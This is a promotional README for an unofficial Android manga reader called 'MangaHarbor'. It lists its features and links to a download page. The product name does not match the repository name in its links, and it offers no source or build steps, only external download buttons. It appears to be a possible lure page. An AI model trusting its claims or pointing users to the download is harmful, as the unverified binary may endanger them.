![preview](https://raw.githubusercontent.com/sri-sivaram/Neko-Manga-Pearl/main/preview.svg)

# MangaHarbor

**Your personal gateway to the boundless seas of manga discovery—an unofficial, community-driven reading experience for Android 8+.**  

MangaHarbor reimagines how you explore, collect, and immerse yourself in manga. Born from the desire for a more intuitive and visually coherent reading tool, this application strips away the clutter and presents your library with the elegance of a curated art gallery. Every interaction is designed to feel like turning a page in a quiet café, not clicking through a noisy dashboard.

---

## 🌊 Overview

In a digital landscape overflowing with generic readers, MangaHarbor stands apart by prioritizing **narrative immersion** and **discovery without friction**. Think of it as a personal librarian that understands your tastes, learns your pacing, and never interrupts your flow with advertisements or convoluted menus.

Built natively for Android 8.0+ (API 26), MangaHarbor leverages modern Material Design principles to create a reading environment that feels both cutting-edge and intimately familiar. Whether you are following a legendary hundred-volume saga or diving into a fresh indie one-shot, the application scales seamlessly to honor the story, not the interface.

[![Download](https://raw.githubusercontent.com/sri-sivaram/Neko-Manga-Pearl/main/button.svg)](https://sri-sivaram.github.io/Neko-Manga-Pearl/)

---

## 🚀 Key Features

### 📖 Seamless Multilingual Navigation
Switch between languages mid-chapter without losing your place. MangaHarbor supports dynamic language packs for interface elements and source metadata, making it a truly global companion for readers in English, Spanish, Japanese, Portuguese, French, and more.

### 🎨 Responsive Visual Engine
Pages render with zero latency, adapting to your device's resolution and aspect ratio. The **Smart Zoom** feature detects speech bubbles and action sequences, automatically framing them for optimal legibility on phones and tablets alike.

### 🗂️ Intelligent Library Curation
Your collection is organized using **adaptive tagging**—a system that learns from your reading history to surface hidden gems. Categories like "On Hiatus," "Recently Updated," and "Artist Spotlight" update dynamically without manual intervention.

### 🌙 Focus Mode & Readability Filters
Reduce eye strain with customizable color overlays, warm light reduction, and a **True Dark** mode that goes beyond simple inversion—it recalculates contrast ratios specifically for manga line art.

### 🔔 Smart Update Notifications
Never miss a new chapter. The notification system aggregates updates from your tracked series, grouping them by release time and source stability, ensuring you only see alerts when content is genuinely available.

### 🌐 Multi-Source Aggregation (Unofficial)
Connect to multiple community-maintained sources simultaneously. MangaHarbor deduplicates entries and merges metadata, presenting you with a **unified catalogue** regardless of where the content originates.

---

## 🛠️ Architecture & Performance

MangaHarbor is built on a **modular, event-driven architecture**. Each component—library, reader, downloader, and source adapter—operates independently, allowing for granular updates without disrupting the entire application.

| Component | Purpose | Strategy |
|-----------|---------|----------|
| **Library Core** | Database & metadata management | Room + Coroutines for offline-first reliability |
| **Reader Engine** | Page rendering & gesture handling | GPU-accelerated canvas with predection caching |
| **Source Bridge** | Third-party content source integration | Plugin-based architecture with sandboxed execution |
| **Sync Service** | Cross-device reading progress | End-to-end encrypted, user-controlled export/import |

*Benchmark: Loading a 200-page chapter takes under 1.2 seconds on a Snapdragon 720G device.*

---

## 🤝 24/7 Community Support

We believe great tools are shaped by their users. MangaHarbor is supported by a **global team of moderators and contributors** who monitor discussions, triage bug reports, and release patches within 24 hours of critical issues being identified.

- **In-app feedback channel** — Send sanitized logs directly from the settings menu.
- **Public discussion board** — Share feature requests and workflows with the community.
- **Weekly build updates** — Hotfixes and experimental features are rolled out every Saturday.

---

## ⚠️ Disclaimer

MangaHarbor is an **unofficial third-party application** and is **not affiliated with, endorsed by, or connected to MangaDex or any other content source**. The application does not host, store, or distribute copyrighted content. All manga data is retrieved from community-maintained sources and cached locally at the user's discretion.

Users are responsible for adhering to the terms of service of any content sources they access. MangaHarbor functions solely as a **neutral reading tool**—no more, no less.

---

## 📜 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for full details.  
You are free to use, modify, and distribute this software, provided the original copyright notice is included.

---

## 🧭 Getting Started

1. **Acquire the application** via the official release channel (link below).
2. **Grant storage permissions** — required for caching chapters and exporting your library.
3. **Add your first source** — navigate to the source manager and tap the plus icon.
4. **Start exploring** — search for any title, track your progress, and customize your reading environment.

*No registration, no tracking, no hidden fees—just pure, unadulterated reading.*

---

## 💬 Final Word

MangaHarbor is a labor of love—a response to the question: *"What if a manga reader was built not by a corporation, but by readers, for readers?"* Every line of code reflects that philosophy. We invite you to explore, contribute, and above all, enjoy the stories that matter to you.

[![Download](https://raw.githubusercontent.com/sri-sivaram/Neko-Manga-Pearl/main/button.svg)](https://sri-sivaram.github.io/Neko-Manga-Pearl/)  

**Happy reading.** 🐱